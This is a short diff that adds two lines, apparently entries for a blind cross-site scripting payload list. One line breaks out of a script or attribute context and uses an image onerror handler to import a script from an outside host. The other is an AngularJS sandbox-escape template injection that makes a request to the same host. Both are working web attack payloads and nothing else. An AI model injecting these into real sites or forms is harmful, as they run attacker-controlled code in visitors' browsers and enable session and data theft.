@@ -1,0 +1,2 @@
+'"></sCript><img/onerror="import('https://acut3.xyz/blind.php')"src>
+{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,(new(Image)).src="https://acut3.xyz/blind.php",a')}}
